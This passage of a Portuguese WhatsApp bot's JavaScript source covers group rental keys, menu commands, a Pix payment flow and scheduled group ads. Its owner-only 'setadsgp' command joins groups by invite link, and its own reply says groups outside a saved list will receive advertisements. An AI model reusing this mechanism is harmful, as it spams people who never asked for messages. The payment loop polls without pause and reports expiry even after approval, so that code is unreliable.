}
}

yoko.sendImageAsSticker = async (jid, path, options = {}) => {
    let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
    let buffer
        if (options && (options.packname || options.author)) {
         buffer = await writeExifImg(buff, options)
            } else {
         buffer = await imageToWebp(buff)
        }
    await yoko.sendMessage(jid, { sticker: { url: buffer }, ...options})
    return buffer
}

yoko.sendInteractiveTXT = async(idChat, mainText = '', footerText = '', quotedMessage = {}, buttonsParams = {}) => {
    try {
        await yoko.relayMessage(idChat, {interactiveMessage: {body: {text: mainText}, footer: {text: footerText}, contextInfo: quotedMessage, nativeFlowMessage: buttonsParams}}, {});
    } catch(errorMessage) {
        await reply(String(errorMessage));
    }
}

yoko.sendIMG = async(imageDir, ChatID, TextM = '',contextMessageInfo = {}) => {
    try {
      
        await yoko.sendMessage(ChatID, {image:  fs.readFileSync(imageDir), caption: TextM, contextInfo: contextMessageInfo}, {quoted: selo})
        
     } catch(errorMessage) {
         return reply(String(errorMessage));
    }
 }

let isCodeKey = Array('aluguel', 'alugueis', 'alugar', 'alugarbot', 'loja', 'dono').some(i => i === command)

if(isGroup && isModoAluguel && isCmd && !SoDono && !isCodeKey) {
if(!JSON.stringify(grupos).includes("Ayanokoji V1 Md -oficial")) {
grupos.push({id: "Ayanokoji V1 Md -oficial", gps: []})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))}
if(!JSON.stringify(grupos).includes(from)) {
grupos.push({id: from, limite: 5, validado: false})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
AB = grupos.map(i => i.id).indexOf(from)
if(grupos[AB].validado == false) {
if(grupos[AB].limite <= 1) {
grupos.splice(AB, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/grupos.json", JSON.stringify(grupos, null, 2))
reply(`â°ï¸â™¦ï¸ *O tempo de espera acabou!* Visto que o(s) senhor(es) nÃ£o desejam comprar uma chave, estou saindo do grupo...`)
await sleep(3000)
return await yoko.groupLeave(from)
} else {
grupos[AB].limite -= 1
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
return await mention(`ğŸ’«ğŸ—£ï¸ NÃ£o encontrei o grupo em meus registros! Por favor, caso esteja alugado ou deseja adquirir uma chave de ativaÃ§Ã£o, entre em contato com o meu dono: *@${nmrdn.split('@')[0]}*`)
}}}

if(chaves.length > 0) {caixa = []
for(k of chaves) {
if(budy2.toUpperCase() === k.key) {
caixa.push(k.key)
}
}
if(VerificarJSON(chaves, caixa[0])) {
AD = chaves.map(i => i.key).indexOf(caixa[0])
timeday = chaves[AD].dias
pessoa = chaves[AD].cliente
infinity = chaves[AD].dias > 0 ? false : true
if(!VerificarJSON(grupos, "Ayanokoji V1 Md -oficial")) {
grupos.push({id: "Ayanokoji V1 Md -oficial", gps: []})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
if(!VerificarJSON(grupos, from)) {
grupos.push({id: from, limite: 5, validado: true})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
} else {
GP = grupos.map(i => i.id).indexOf(from)
grupos[GP].validado = true
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
}
if(infinity == false) {
if(chaves[AD].tipo == 1 && isGroup) {
if(!VerificarJSON(aluguel, from)) {
aluguel.push({id: from, nome: groupName, tempo: timeday, totalRent: timeday, cliente: pessoa, save: Number(moment.tz('America/Sao_Paulo').format('DD')), cortesia: false})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
chaves.splice(AD, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
reply(`â™¦ï¸ğŸ›’ O grupo foi registrado com sucesso ao aluguel! *Qualquer dÃºvida entre em contato com meu dono.*`)
await sleep(2000)
await yoko.sendMessage(nmrdn, {text: `âš ï¸ğŸ›’ CÃ³digo de aluguel foi validado no grupo com sucesso! Registrado no nome de *@${pessoa.split('@')[0]}*\nâ€¢ Grupo registrado: *${groupName}*`, mentions: [pessoa]})
} else {
AB = aluguel.map(i => i.id).indexOf(from)
aluguel[AB].cortesia = false
aluguel[AB].nome = groupName
aluguel[AB].totalRent = aluguel[AB].tempo + timeday
aluguel[AB].tempo += timeday
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
chaves.splice(AD, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
reply(`+${timeday} dia${Number(timeday) > 1 ? 's' : ''} adicionado${Number(timeday) > 1 ? 's' : ''} para o grupo em meu banco de dados.`)
await sleep(2000)
await yoko.sendMessage(nmrdn, {text: `âš ï¸ğŸ›’ CÃ³digo de aluguel foi validado no grupo com sucesso! Registrado no nome de *@${pessoa.split('@')[0]}*\nâ€¢ Grupo registrado: *${groupName}*`, mentions: [pessoa]})
}
}
        
if(chaves[AD].tipo == 2 && isGroup) {
CD = grupos.map(i => i.id).indexOf("Ayanokoji V1 Md -oficial")
if(!VerificarJSON(grupos[CD].gps, from)) {
if(!VerificarJSON(aluguel, from)) {
grupos[CD].gps.push({id: from})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/grupos.json", JSON.stringify(grupos, null, 2))
aluguel.push({id: from, nome: groupName, tempo: 24, totalRent: 24, cliente: sender, save: Number(moment.tz('America/Sao_Paulo').format('mm')), cortesia: true})
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/aluguel.json", JSON.stringify(aluguel, null, 2))
reply(`âœ…ï¸â™¦ï¸ CÃ³digo Card Cortesia validado com sucesso! 24h liberadas neste grupo contando a partir de agora.`)
await sleep(2000)              
await yoko.sendMessage(nmrdn, {text: `âš ï¸â™¦ï¸ï¸ CÃ³digo *Card Cortesia* foi validado no grupo, registrado no nome de *@${pessoa.split('@')[0]}*.\nâ€¢ Grupo registrado: *${groupName}*`, mentions: [pessoa]})
} else reply("[!] Este grupo jÃ¡ estÃ¡ registrado em meu banco de dados.")
} else reply("[!] JÃ¡ foi validado neste mÃªs uma cortesia neste grupo.")
}
} else {
if(chaves[AD].tipo == 1 && isGroup) {
chaves.splice(AD, 1)
fs.writeFileSync("./yoko/bunker/database/grupos/aluguel/chaves.json", JSON.stringify(chaves, null, 2))
reply(`[!] O grupo foi salvo no meu banco de dados com sucesso!`)
}}}}




const PlayPath = './yoko/src/play-dados.json';


async function salvarLink(link, NomeMusica, LinkImage, numero) {
    let dados = [];
    try {
        const conteudo = await fs.readFile(PlayPath, 'utf-8');
        dados = JSON.parse(conteudo);
    } catch (error) {
        if (error.code !== 'ENOENT') {
            console.error('Erro ao ler o arquivo:', error);
            throw error;
        }
    }
    const indice = dados.findIndex(item => item.numero === numero);

    if (indice !== -1) {
        dados[indice].link = link;
        dados[indice].NomeMusica = NomeMusica;
        dados[indice].LinkImage = LinkImage;
        console.log('Link e Nome da MÃºsica atualizados para o usuÃ¡rio:', numero);
    } else {
        dados.push({ link, NomeMusica, LinkImage, numero });
        console.log('Link, Nome da MÃºsica e nÃºmero salvos com sucesso!');
    }
    await fs.writeFile(PlayPath, JSON.stringify(dados, null, 2));
}

async function resgatarLinks() {
    if (fs.existsSync(PlayPath)) {
        const conteudo = fs.readFileSync(PlayPath, 'utf-8');
        const dados = JSON.parse(conteudo);
        return dados;
    } else {
        console.log('Nenhum dado encontrado.');
        return [];
    }
}
async function buscarLink(numero) {
    try {
        const conteudo = await fs.readFile(PlayPath, 'utf-8');
        const dados = JSON.parse(conteudo);
        const usuario = dados.find(item => item.numero === numero);

        if (usuario) {
            return usuario;
        } else {
            console.log('UsuÃ¡rio nÃ£o encontrado.');
            return null;
        }
    } catch (error) {
        if (error.code === 'ENOENT') {
            console.log('Arquivo nÃ£o encontrado.');
        } else {
            console.error('Erro ao ler o arquivo:', error);
        }
        return null;
    }
}

async function bufferImg(imageUrl) {
const fileName = 'imagem.jpg';
const headers = {
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
};
axios.get(imageUrl, { responseType: 'arraybuffer', headers }).then(async(response) => {
fs.writeFileSync(fileName, response.data);
yoko.sendMessage(from, {image: {url: fileName}}, {quoted: info});
}).catch((err) => {
return reply("Erro!!");
});
}

function uploadX(midia) {
return new Promise(async (resolve, reject) => {
try {
const { fromBuffer } = require("file-type");
const { ext } = await fromBuffer(midia);
const form = new FormData();
form.append("file", midia, "tmp." + ext);
fetch(`https://api.bronxyshost.com.br/api-bronxys/link_imagem?apikey=${API_KEY_BRONXYS}`, {
method: "POST",
body: form
}).then((response) => response.json())
.then((data) => {
resolve(data.link);
}).catch((error) => reject(error));
} catch (error) {
console.log(error);
reject(error);
}
});
} // FUNÃ‡ÃƒO PARA GERAR LINK DE IMAGEM

// ÃNICIO: CASES / COMANDOS COM PREFIXO:
switch(command) {
//INICIO DOS MENUS
case 'menu': 
await reagir(from, "â™¦ï¸");
yoko.sendIMG(
MenuPerfil, 
from,
linguagem.menu(prefix, NomeDoBot, pushname, isCargo, isChVip),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break


case 'menu1':
await reagir(from, "â™¦ï¸");
if(isAudioMenu) {
audiomenu = await fetch(audio_menu).then(v => v.buffer())
await yoko.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mpeg', ptt:true}, {quoted: selo})
}
yoko.sendIMG(
MenuPrincipalImg, 
from,
linguagem.menuPrincipal(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break 

case 'menu5':
case 'logos': case 'menulogo': case 'menulogos':
await reagir(from, "ğŸƒ");
yoko.sendIMG(
MenuPrincipalImg, 
from,
linguagem.menulogos(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break 

case 'menu8':
case 'menu18':
await reagir(from, "ğŸ˜ˆ");
yoko.sendIMG(
MenuPrincipalImg,
from,
linguagem.menu18(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break

case 'menu2':
case 'menuadm': case 'menuadms': case 'adm':
if(!isGroupAdmins && SoDono) return reply(mess.onlyOwner())
await reagir(from, "ğŸ‘‘");
yoko.sendIMG(
MenuPrincipalImg, 
from,
linguagem.adms(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break

case 'menu3':
case 'menudono': case 'donomenu':
if(!SoDono) return reply(mess.onlyOwner())
await reagir(from, "ğŸ‘¨ğŸ»â€ğŸ’»");
yoko.sendIMG(
MenuPrincipalImg, 
from,
linguagem.menudono(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break 

case 'menu7':
await reagir(from, "ğŸ“¥");
yoko.sendIMG(
MenuPrincipalImg,
from,
linguagem.efeitos(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break

case 'menu6':
case 'alteradores':
await reagir(from, "ğŸª„");
yoko.sendIMG(
MenuPrincipalImg,
from,
linguagem.alteradores(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break 

case 'menu4':
case 'brincadeiras':
case 'brincadeira':
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await reagir(from, "ğŸ˜¹");
yoko.sendIMG(
MenuPrincipalImg, 
from,
linguagem.brincadeiras(prefix),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break 

case 'menu9':
case 'menuvip':
if(isCmdVip.length == 0) return reply(`Atualmente meu/minha dono(a), nÃ£o adicionou nenhum comando Ã  este menu.\n- Caso vocÃª seja o(a) dono(a), visualize o comando: ${prefix}infocmdvip, para entender como funciona esta nova funcionalidade do bot.`)
await reagir(from, "ğŸ’«");
yoko.sendIMG(
MenuPrincipalImg,
from,
linguagem.menuvip(isCmdVip, prefix, capitalizeFirstLetter),
{participant: 
sender, 
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: '12036326753195844@newsletter',
newsletterName: `AYANOKOJI V1 MD`,
serverMessageId: -1
}, quotedMessage: info.message});
break 



case 'owner': case 'odono': case 'dono': case 'infodono':
await reagir(from, "ğŸ‘¨ğŸ»â€ğŸ’»");
numerodn = numerodono_ofc
await yoko.sendMessage(from, {image: {url: ftmenu.logo}, caption: getInfo.infoOwner(prefix, ownerName, numerodn, NomeDoBot, sender), mentions: [sender]}, {quoted: selo})
break

case 'lojinha':
case 'loja':
case 'comprar':
case 'alugar': {
reagir(from, "ğŸ›’")
moneybot = `â•“â”°â•Œâ­’âŠâ•Œâ•âŠ±ğ–§·âŠ°â™¦ï¸âŠ±ğ–§·âŠ°â•â•ŒâŠâ­’â•Œâ•®
â•‘â”‹ â¯â¯ PLANOS BOT â®â®
â•‘â”£â•Œâ­’âŠâ•Œâ•âŠ±ğ–§·âŠ°â™¦ï¸âŠ±ğ–§·âŠ°â•â•ŒâŠâ­’â•Œâ•¯
â•‘â”ƒà£ªÖªâ•­â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼
â•‘â”ƒà£ªÖªâ”œÌŸÌ‡×â¯â¯â–º R$10.00 â¯â¯ 15 DIAS â®â®
â•‘â”ƒà£ªÖªâ”œÌŸÌ‡×â¯â¯â–» R$30.00 â¯â¯ 30 DIAS â®â®
â•‘â”ƒà£ªÖªâ”œÌŸÌ‡×â¯â¯â–º R$50.00 â¯â¯ 60 DIAS â®â®
â•‘â”ƒà£ªÖªâ”œÌŸÌ‡×â¯â¯â–» COMPRAR ARQUIVO R$80.00
â•‘â”–â”´â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼â–³â–¼
â•‘ *Obs: CASO QUEIRA COMPRAR O ARQUIVO DO BOT*
â•‘ *UTILIZE O COMANDO ${prefix}Comprar_bot*
â”—â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”€â”€ï¸©ï¸ªà¹‹â”›`;
var download = [
`ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–’â–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™0%`,
`ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–’â–’â–’â–’â–’â–’â–’â–’â–’ã€™10%`,
`ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’â–’â–’ã€™35%`,
`ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’â–’â–’ã€™51%`,
`ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’ã€™62%`,
`ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ã€™80%`,
`ÊŸá´á´€á´…ÉªÉ´É¢ã€˜â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆã€™100%`,
`ğ™»ğ™¾ğ™°ğ™³ğ™¸ğ™½ğ™¶ ğ™²ğ™¾ğ™¼ğ™¿ğ™»ğ™´ğšƒğ™´ğ™³...`
]
let { key } = await yoko.sendMessage(from, {text: tempo+" "+pushname}, {quoted: selo})
await sleep(2000)
for(let i = 0; i < download.length; i++) {
await yoko.sendMessage(from, {text: download[i], edit: key }, {quoted: selo})
}
yoko.sendMessage(from, {text: moneybot}, {quoted: selo})
}
break

//Fim Menus

//COMANDOS COM PROTEÃ‡ÃƒO ORBITAL PROTECTION V1


case 'comprar_bot':
//if(!q) return reply('*CADE O VALO DO PIX?*')
reply('*â¯â¯ GERANDO PIX â®â®*')
    let descricao = 'teste'; 
    let nsmr = Number(80); 

    try {
        const idempotencyKey = uuidv4();
        await sleep(500)
        let pagamentoInfo = await criarPagamentoPix(nsmr, descricao, idempotencyKey);

 await yoko.sendMessage(sender, { 
            image: Buffer.from(pagamentoInfo.qr_code_base64, "base64"), 
            caption: `*â¯â¯ PIX GERADO COM SUCESSO â®â®*\n*Acima contÃ©m o Qr code para efetuar o pagamento, mais caso precise abaixo sera enviado o pix copia e cola*\n*ID:* ${pagamentoInfo.id}\n*STATUS:* ${pagamentoInfo.status}\n*â¯â¯ CÃ“DIGO COPIA E COLA ABAIXO â®â®â†´*` 
        });
        await yoko.sendMessage(from, { 
            text: `${pagamentoInfo.qr_code}` 
        });
    let check = await verificarPix(pagamentoInfo.id);
    
    while(check.status == 'pending') { check = await verificarPix(pagamentoInfo.id) }
    if(check.status == "approved") {
   await reply(`*â¯â¯ PAGAMENTO CONFIRMADO â®â®\n*ADICIONANDO COINS*`)
  // await sleep(500)
   //await AdicionarSaldo(sender, nmr)
   await sleep(500)
   await reply('*â¯â¯ COINS ADICIONADOS COM SUCESSO â®â®')
    }
    reply("Pagamento expirado ãƒ…")
    } catch (error) {
        await yoko.sendMessage(from, { text: `Erro ao criar o pagamento: ${error.message}` });
    }
    break;
case 'listarevgp':
setTimeout(() => {reagir(from, "âœ…")}, 300)
if(!SoDono) return reply('```SOMENTE MEU DONO LINDÃƒO```')
var getGroups = await yoko.groupFetchAllParticipating()
var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
var ingfoo = groups.map(v => v)
ingfoo.sort((a, b) => (a[0] < b.length))
teks1 = "áá†ÕÍ²áª á á¬ á€á¡á‚®á¢Ï´Õ á Ï´ á´Ï´Í²\nÍ²Ï´Í²áªá ( "+ingfoo.length+" )\n________________________________________"
for (let i = 0; i < ingfoo.length; i++){
matheuzinho = JSON.stringify(revealmsg).includes(ingfoo[i].id) ? "âœ…" : "âŒ"
teks1 += "\n\nÂ»"+i+"Â«\nâ¤ÍŸÍÍŸÍ ê¦¿ğ™½ğš˜ğš–ğš ğ™³ğš˜ ğ™¶ğš›ğšğš™ğš˜ â†´\nã€˜ "+ingfoo[i].subject+" ã€™\nâ¤ÍŸÍÍŸÍ ê¦¿ğ™¸ğ™³ ğ™³ğš˜ ğ™¶ğš›ğšğš™ğš˜ â†´\nÃ— "+ingfoo[i].id+"\nâ¸ºÍŸÍêª¶ğ™°ğšğš’ğšŸğšŠğšğš˜â‡’ã€ "+matheuzinho+" ã€\n________________________________________"
}
reply(teks1)
break

case 'resetadsgp':
if(!SoDono) return reply(enviar.msg.dono)
if(!JSON.stringify(adsgp).includes("grupos")) {
  adsgp.push({tipo: "grupos", gps: []})
  fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
}
if(!JSON.stringify(adsgp).includes("mensagens")) {
  adsgp.push({tipo: "mensagens", msgs: []})
  fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
}
AB = adsgp.map(i => i.tipo).indexOf("grupos")
AC = adsgp.map(i => i.tipo).indexOf("mensagens")
adsgp[AB].gps = []
fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
adsgp[AC].msgs = []
fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
reply("Sistema resetado")
break

case 'setadsgp':
if(!SoDono) return reply(enviar.msg.dono)
if(!isGroup) return reply(enviar.msg.grupo)
if(!JSON.stringify(adsgp).includes("quantidade")) {
  adsgp.push({tipo: "quantidade", quant: 5})
  fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
}
if(!JSON.stringify(adsgp).includes("grupos")) {
  adsgp.push({tipo: "grupos", gps: []})
  fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
}
if(!JSON.stringify(adsgp).includes("mensagens")) {
  adsgp.push({tipo: "mensagens", msgs: []})
  fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
}
var [linkM4, msgM4] = q.split('|')
AB = adsgp.map(i => i.tipo).indexOf("grupos")
AC = adsgp.map(i => i.tipo).indexOf("mensagens")
if(!linkM4) return reply('Insira um link de convite ao lado do comando.')
if(!msgM4) return reply(`Vejo que vocÃª nÃ£o inseriu a mensagem que serÃ¡ enviada... FaÃ§a assim:\n${prefix+command} link do grupo|mensagem para enviar`)
if(linkM4.includes('chat.whatsapp.com/')) {
  link = linkM4.split('app.com/')[1]
  try {
    var getGroups = await yoko.groupFetchAllParticipating()
    var groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
    var ingfoo = groups.map(v => v)
    ingfoo.sort((a, b) => (a[0] < b.length))
    grupos77 = []
    for(i = 0; i < ingfoo.length; i++) {
      grupos77.push({groupId: ingfoo[i].id})
    }
    adsgp[AB].gps = grupos77
    fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
    adsgp[AC].msgs.push({txt: msgM4, cobrado: false})
    fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
    yoko.groupAcceptInvite(`${link}`)
    return reply(`Todos os grupos da lista foram salvos na pasta... Qualquer grupo que esteja fora da lista serÃ¡ tratado como indigno e rÃ©u de receber anÃºncios em seu chat`)
  } catch(erro) {
    if(String(erro).includes('resource-limit') ) {
      reply('O grupo jÃ¡ estÃ¡ com o alcance mÃ¡ximo de membros.')
    }
    if(String(erro).includes('not-authorized') ) {
      reply('NÃ£o foi possÃ­vel entrar no grupo.\nMotivo: Banimento.')
    }
  }
} else return reply('Ops, verifique o link que vocÃª inseriu.')
break

case 'setadstime': case 'sat':
if(!SoDono) return reply(enviar.msg.dono)
if(!JSON.stringify(adsgp).includes("quantidade")) {
  adsgp.push({tipo: "quantidade", quant: 5})
  fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
}
if(!Number(args[0]) || Number(args[0]) < 1) return reply(`Defina a quantidade de mensagens a serem enviadas no grupo ao usar o comando ${prefix}setadsgp

Ex: ${prefix+command} 5`)
if(q.includes(".")) return reply("NÃ£o pode nÃºmeros decimais")
AB = adsgp.map(i => i.tipo).indexOf("quantidade")
adsgp[AB].quant = Number(args[0])
fs.writeFileSync("./yoko/base de funcionamento/adsgp.json", JSON.stringify(adsgp, null, 2))
reply(`Quant. de mensagens definida com sucesso âœ…`)
break

case 'startads': case 'endads':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
adsStart = getGroupAds(from)
if(adsStart.acctive) {
adsStart.acctive = false
saveADS()
return reply(`â• *ADs System desativado com sucesso* ğŸ—¯`)
} else {
adsStart.acctive = true
saveADS()
return reply(`ğŸ”° *ADs System ativado com sucesso* ã€½`)
}
break

case 'addads': case 'setads':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
if(!getGroupAds(from).acctive) return reply(enviar.adsatc)
if(!q) return reply(`Retorne apÃ³s o comando a sua mensagem/anÃºncio... Ex:
${prefix+command} sua mensagem aqui`)
var [qp, tm] = q.split("|")
adsStart = getGroupAds(from)
if(isImage || isQuotedImage) { try { media = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
gfb = await getFileBuffer(media, 'image')
img = await upload(gfb)
addAdminAds(from, sender, true, img)
saveADS() } catch { return reply(`NÃ£o foi possÃ­vel salvar essa imagem... âŒ`) } } else { addAdminAds(from, sender, existAdminAds(from, sender) ? getAdminAds(from, sender).true_false : false, existAdminAds(from, sender) ? getAdminAds(from, sender).url : ``) }
if(!tm || (!tm.includes("h") && !tm.includes("m"))) return isIOS ? reply(`Defina o tempo de envio, do mesmo jeito do exemplo abaixo, separando o anÃºncio e o tempo com uma barra ( | )... Ex:\n${prefix+command} sua anÃºncio|1h`) : sendListB(from, {text: `Selecione agora o tempo de intervalo entre o envio de cada mensagem...`, footer: `Clique na lista abaixo para selecionar o horÃ¡rio:`}, yoko, sender, `ğŸ’¢ CLIQUE AQUI ğŸ’¢`, [{title: `Escolha aqui...`, options: adsStartList(prefix+command+` `+qp)}], seloctt)
gpadm = getAdminAds(from, sender)
end = gpadm.true_false
urlads = gpadm.url
addAds(from, qp, tm, sender, end, urlads)
mention(`*O anÃºncio foi setato neste grupo a cada ${tm} pelo adm @${sender.split("@")[0]} com sucesso* âœ…`)
await sleep(2000)
if(end) { sendImage(from, urlads, qp) } else { sendMess(from, qp) }
break

case 'listads':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
if(!getGroupAds(from).acctive) return reply(enviar.adsatc)
groupAds = getGroupAds(from).horarios
if(groupAds.length <= 0) return reply(`NÃ£o hÃ¡ anÃºncios definidos neste grupo...`)
txt = `ğŸ“› *Lista de anÃºncios programados neste grupo:*
ğŸ”° *Total:* ${groupAds.length}

${groupAds.map(i =>
`ğŸ­ *ID:* ${i.id}
ğŸ“– *ADS:* ${i.text.length > 50 ? i.text.slice(0, 50) + `...` : i.text}
â± *Tempo:* ${String(i.type.valor_numerico) + i.type.hm}
ğŸ§© *PrÃ³ximo ADS:* ${i.tempo}
ğŸ–¼ *MÃ­dia ( ${i.imagem.true_false ? `âœ”` : `âœ–`} )*`).join(`\n\n`)}`
reply(txt)
break

case 'rmads':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
if(!getGroupAds(from).acctive) return reply(enviar.adsatc)
groupAds = getGroupAds(from).horarios
if(groupAds.length <= 0) return reply(`NÃ£o hÃ¡ anÃºncios definidos neste grupo...`)
r1 = `ğŸ­ *Retorne apÃ³s o comando o id do anÃºncio que vocÃª quer deletar:*`
lista = []
for(i of groupAds) {lista.push({title: `ğŸ†” ${i.id}`, body: i.text.length > 50 ? i.text.slice(0, 50) + `...` : i.text, command: prefix+command+` `+i.id})}
if(groupAds.length >= 2) lista.push({title: `âŒ DELETAR TODOS OS IDS`, body: `AÃ§Ã£o irreversÃ­vel`, command: prefix+command+` all`})
if(!q || !isIDads(from, q) && q.toLowerCase() != `all`) return isIOS ? reply(`${r1}\n*Ex* ${prefix+command} 010124013045\n_(Olhe no comando ${prefix}listads os ID disponÃ­veis)_`) : sendListB(from, {text: r1, footer: `_Selecione abaixo os ID na lista..._`}, yoko, sender, `ğŸ“› CLIQUE AQUI ğŸ“›`, [{title: `For Black System`, options: lista}], seloctt)
if(q.toLowerCase() == `all`) {
AB = ads.map(a => a.groupId).indexOf(from)
ads.splice(AB, 1)
saveADS()
return reply(`*Todos os anÃºncios foram deletados com sucesso* âœ”`) } else {
rmAds(from, q)
return reply(`*O anÃºncio de ID ${q} foi deletado com sucesso* âœ”`) }
break

case 'rmtimeads': case 'rmtmads':
if(!isGroup) return reply(enviar.msg.grupo)
if(!isGroupAdmins) return reply(enviar.msg.adm)
if(!getGroupAds(from).acctive) return reply(enviar.adsatc)
groupAds = getGroupAds(from).horarios
if(groupAds.length <= 0) return reply(`NÃ£o hÃ¡ anÃºncios definidos neste grupo...`)
if(!q) return reply(`ğŸ­ *Retorne apÃ³s o comando o id do anÃºncio que vocÃª quer retirar os minutos que sobram:*\n*Ex* ${prefix+command} 010124013045\n_(Olhe no comando ${prefix}listads os ID disponÃ­veis)_`)
var [idads, typeads] = q.split("|")
if(!isIDads(from, idads)) return reply(`ID do anÃºncio nÃ£o encontrado neste grupo âŒ`)
if(!typeads) return sendButton(from, {text: `Selecione agora o modo de tempo na qual vocÃª irÃ¡ remover...`, footer:
